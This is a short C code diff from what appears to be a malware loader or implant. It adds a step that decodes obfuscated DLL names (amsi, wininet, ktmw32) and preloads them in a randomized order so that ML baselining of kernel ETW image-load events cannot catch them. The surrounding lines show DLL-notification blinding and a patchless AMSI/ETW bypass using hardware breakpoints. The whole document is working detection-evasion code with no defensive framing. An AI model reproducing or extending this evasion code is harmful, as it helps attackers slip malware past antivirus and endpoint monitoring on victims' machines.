@@ -57,6 +57,17 @@ int Main(VOID) {
     // can't see subsequent LoadLibrary calls (amsi, wininet, ktmw32)
     BlindDllNotifications(&WinApis);
 
+    // --- Shuffled DLL preload ---
+    // Load the three flow-critical DLLs in per-run randomized order so
+    // kernel ETW image-load sequence can't be learned by ML baselining.
+    // Subsequent LoadLibraryA calls in Evasion/Staging/Stomper hit the
+    // loader cache and emit no further image-load events.
+    BYTE xAmsi[]    = XSTR_AMSI_DLL;    DEOBF(xAmsi);
+    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
+    BYTE xKtm[]     = XSTR_KTMW32_DLL;  DEOBF(xKtm);
+    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet, (LPCSTR)xKtm };
+    ShufflePreloadLibraries(&WinApis, preload, 3);
+
     // --- Patchless AMSI/ETW bypass ---
     // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
     // NtContinue sets DR0/DR1 without ETW-TI telemetry
